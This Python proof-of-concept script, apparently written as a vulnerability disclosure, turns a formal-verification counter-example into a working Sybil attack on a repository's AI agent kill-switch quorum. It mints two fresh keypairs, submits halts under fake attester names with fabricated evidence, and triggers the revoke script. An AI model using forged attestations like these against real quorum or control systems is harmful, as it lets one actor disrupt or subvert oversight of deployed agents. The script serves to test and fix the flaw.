#!/usr/bin/env python3
"""
Proof-of-concept for the Sybil vulnerability identified by the formal-
verification work (THM K5 in kill_switch_safety.smt2).

This script executes the SMT counter-example against the REAL deployed
`harp.py` + `avs.py` modules to demonstrate that the kill-switch fires
when a single attacker controls M = 2 freshly minted attester_ids.

Run:
    python3 formal_verification/sybil_attack_proof_of_concept.py

Expected output ends with "ATTACK SUCCESSFUL: kill switch fired".
"""
from __future__ import annotations

import pathlib
import sys
from datetime import datetime, timedelta, timezone

_REPO = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO / "src" / "money_python"))

import obac          # noqa: E402  (after sys.path insert)
import harp          # noqa: E402


def _ts(seconds_offset: float, base: str = "2026-05-12T00:00:00+00:00") -> str:
    return (datetime.fromisoformat(base) + timedelta(seconds=seconds_offset)).isoformat()


def main() -> int:
    chain_path = pathlib.Path("/tmp/sybil_poc_chain.jsonl")
    if chain_path.exists():
        chain_path.unlink()
    chain = obac.Chain.new(chain_path)
    target_subject = "calm-agent-target"

    # ----- ATTACKER ACTIONS -----
    # Step 1: attacker generates M = 2 fresh Ed25519 keypairs.
    sybil_priv_1, sybil_pub_1 = obac.gen_keypair()
    sybil_priv_2, sybil_pub_2 = obac.gen_keypair()

    print("Attacker minted 2 fresh keypairs:")
    print(f"  sybil_1 pub = {obac.pubkey_b64(sybil_pub_1)[:24]}...")
    print(f"  sybil_2 pub = {obac.pubkey_b64(sybil_pub_2)[:24]}...")

    # Step 2: attacker assigns each pubkey a distinct attester_id and submits
    # one halt each, well within the 60s window, with no prior history.
    harp.submit_halt(
        chain, target_subject, "sybil_alice", sybil_priv_1,
        violation_layer="alignment-maxim",
        violation_evidence=["x://fabricated-evidence-1"],
        rationale="claimed misalignment",
        submitted_at=_ts(0),
    )
    harp.submit_halt(
        chain, target_subject, "sybil_bob", sybil_priv_2,
        violation_layer="alignment-maxim",
        violation_evidence=["x://fabricated-evidence-2"],
        rationale="claimed misalignment",
        submitted_at=_ts(15),
    )

    # Step 3: check_quorum with K = 2 (the deployed default) and the
    # 0.5 reliability floor.
    result = harp.check_quorum(
        chain, target_subject,
        k=2,
        window_seconds=60.0,
        min_attester_reliability=0.5,
    )

    print()
    print("Quorum check result:")
    print(f"  concurred              = {result.concurred}")
    print(f"  counted_attesters      = {result.counted_attesters}")
    print(f"  rejected_low_reliab    = {result.rejected_low_reliability}")
    print(f"  layer                  = {result.layer}")

    if result.concurred:
        # Verify the kill-switch artifact actually emits a revoke script.
        script = harp.emit_revoke_script(result, agent_ids=["calm-agent-1"])
        print()
        print("emit_revoke_script produced:")
        for line in script.splitlines():
            print(f"  | {line}")
        print()
        print("ATTACK SUCCESSFUL: kill switch fired from ONE attacker with "
              "2 fresh keypairs. No real attestor pool was needed.")
        print("This is the cryptographic-counter-example to the claim "
              "\"AAL Component 5 is Sybil-resistant\".")
        return 0

    print()
    print("Attack failed (unexpected). The deployed code may have changed.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
